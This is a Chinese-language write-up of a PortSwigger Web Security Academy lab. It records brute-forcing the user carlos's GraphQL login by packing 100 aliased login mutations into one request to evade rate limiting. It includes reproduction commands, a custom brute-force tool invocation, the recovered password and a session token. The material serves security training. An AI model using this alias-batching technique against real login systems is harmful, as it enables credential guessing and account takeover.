---
title: "lab-graphql-brute-force-protection-bypass"
links:
  - target: graphql-family
    relation: evidences
---

# lab-graphql-brute-force-protection-bypass

> evidences: [[graphql-family]]

- 题面:Bypassing GraphQL brute force protections(/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- 实例:https://0a43009503c7b5fa801bc24200e300ab.web-security-academy.net
- 判定目标:爆破登录机制,以 carlos 身份登录

## 关键步

1. 登录面 JS(`loginGql.js`):`mutation login($input: LoginInput!){login(input:$input){token success}}`;`POST /graphql/v1` 有效,`GET` → 405。
2. 口令源:题目描述指定 `/web-security/authentication/auth-lab-passwords`(100 条常见口令);抓取存档并抽成 `/tmp/pwlist.txt`(100,含 3 字符 `mom`)。
3. 别名单包爆破:一封 mutation 内并列 100 个别名 `a0..a99`,各 `login(input:{username:"carlos",password:<p_i>}){token success}`;单请求即绕开同源速率限制。由**新 labkit 件 `gql_alias_brute`** 生成并发送。
4. 命中:`a85` / password=`access` / `success:true`,并返回 carlos 的 token;`gql_alias_brute` 将该 token 写入 jar 的 `session`。
5. 收尾:`GET /my-account?id=carlos` → `Your username is: carlos`。

## 交册值

carlos / `access`。

## 证据摘录

```
gql_alias_brute <inst>/graphql/v1 carlos /tmp/pwlist.txt --jar /tmp/mar-jar.json
 -> {"attempts":100,"status":200,"found":true,
     "winner":{"alias":"a85","password":"access","token":"36iOObhBBvw0yLf9mRaaBjKkuxxKLDZJ"}}
GET /my-account?id=carlos (session=<token>) -> "Your username is: carlos"
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass"
lab_launch launch <lab_id> --widget-source /web-security/graphql/lab-graphql-brute-force-protection-bypass --jar /tmp/mar-jar.json
lab_http get "https://portswigger.net/web-security/authentication/auth-lab-passwords" --out /tmp/auth-passwords.html
html_text /tmp/auth-passwords.html --tag code --tokens --max 100 --out /tmp/pwlist.txt   # 手术刀取 100 条口令
gql_alias_brute "<inst>/graphql/v1" carlos /tmp/pwlist.txt --jar /tmp/mar-jar.json
lab_http get "<inst>/my-account?id=carlos" --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

## 独立性如实标注

规则更正(禁读题解)前,抓页/摘要步骤读到了题页 solution 文本。别名+口令表的方向亦由题目描述明示;手法为自建 `gql_alias_brute` 实证,但不能排除题解影响。
